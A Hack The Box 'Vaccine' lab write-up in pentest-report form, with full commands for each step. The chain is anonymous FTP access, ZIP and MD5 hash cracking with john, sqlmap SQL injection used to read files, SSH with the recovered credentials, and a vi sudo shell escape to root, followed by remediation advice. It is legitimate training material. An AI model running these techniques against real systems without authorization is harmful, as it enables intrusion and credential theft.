HTB Vaccine — From Anonymous FTP to Root
Executive Summary

The target system was fully compromised by chaining multiple low-to-medium severity misconfigurations. Anonymous FTP access exposed a password-protected backup containing application source code. Weak cryptographic practices enabled credential recovery, which allowed authenticated access to the web application. An authenticated SQL injection vulnerability was then exploited to read server-side files, exposing database credentials. These credentials enabled SSH access as a system user, and a misconfigured sudo rule allowed privilege escalation to root.

Impact: Full system compromise
Attack Complexity: Low
User Interaction Required: None

Scope & Target

Target IP: 10.129.95.174

Operating System: Ubuntu Linux

Services in Scope: FTP (21), SSH (22), HTTP (80)

Reconnaissance
Network Enumeration
sudo nmap -A 10.129.95.174


Findings:

Port	Service	Details
21	FTP	vsftpd 3.0.3 — anonymous login enabled
22	SSH	OpenSSH 8.0p1
80	HTTP	Apache 2.4.41 — MegaCorp Login

Anonymous FTP access immediately represented a high-risk entry point.

Initial Access — Anonymous FTP
FTP Enumeration
ftp 10.129.95.174
# username: anonymous
# password: anonymous


A file named backup.zip was discovered and downloaded:

get backup.zip

Credential Exposure — Cracking backup.zip

The ZIP archive was password-protected.

Extract ZIP hash
zip2john backup.zip > hash.zip

Crack ZIP password
john hash.zip


Recovered ZIP password:

741852963

Extract contents
unzip backup.zip


Files extracted:

index.php

style.css

Web Application Analysis
Source Code Review

From index.php:

if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")


This revealed:

Hardcoded admin username

Password stored as unsalted MD5 hash

Password Cracking — Admin Credentials
Crack MD5 hash
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


Recovered credentials:

admin : qwerty789

Authenticated Access — Web Dashboard

Logged in at:

http://10.129.95.174/dashboard.php


The dashboard contained a search parameter:

/dashboard.php?search=<input>


This parameter was tested for SQL injection.

Authenticated SQL Injection
SQLMap (authenticated)
sqlmap -u "http://10.129.95.174/dashboard.php?search=test" \
--cookie="PHPSESSID=<valid_session>" \
--batch --dbs


Results:

SQL injection confirmed

Backend DBMS: PostgreSQL

Schema enumeration revealed only application data (cars table)

No credential tables existed in the database.

File Disclosure via SQL Injection

Since credentials were not stored in tables, SQL injection was leveraged for file read.

Read application files
sqlmap -u "http://10.129.95.174/dashboard.php?search=test" \
--cookie="PHPSESSID=<valid_session>" \
--file-read="/var/www/html/dashboard.php"

Retrieved database credentials
pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

Lateral Movement — SSH Access
SSH login as postgres
ssh postgres@10.129.95.174


Password:

P@s5w0rd!


User flag obtained:

cat user.txt

Privilege Escalation
Sudo enumeration
sudo -l


Misconfiguration identified:

(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf


Allowing vi as root is dangerous because it can spawn a shell.

Root Access via vi Abuse
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf


Inside vi:

:set shell=/bin/sh
:shell

Root confirmed
whoami
# root


Root flag:

cat /root/root.txt

Findings Summary
#	Finding	Severity
1	Anonymous FTP exposing backups	High
2	Weak password protection on backups	High
3	Hardcoded credentials in source code	High
4	Unsalted MD5 password hashing	High
5	Authenticated SQL Injection	Critical
6	Plaintext DB credentials in web files	Critical
7	Dangerous sudo rule (vi as root)	Critical
Impact

A remote, unauthenticated attacker can escalate to full root compromise by chaining multiple common misconfigurations. No advanced exploitation techniques were required.

Remediation Recommendations

Disable anonymous FTP access.

Remove sensitive backups from public services.

Store secrets outside the webroot.

Replace MD5 with modern password hashing (bcrypt/argon2).

Use prepared statements to prevent SQL injection.

Restrict database credentials and rotate exposed passwords.

Remove editor binaries from sudo rules.

Conclusion

This compromise demonstrates how small security oversights compound into total system failure. The attack chain required no zero-day vulnerabilities—only misconfigurations and insecure development practices.

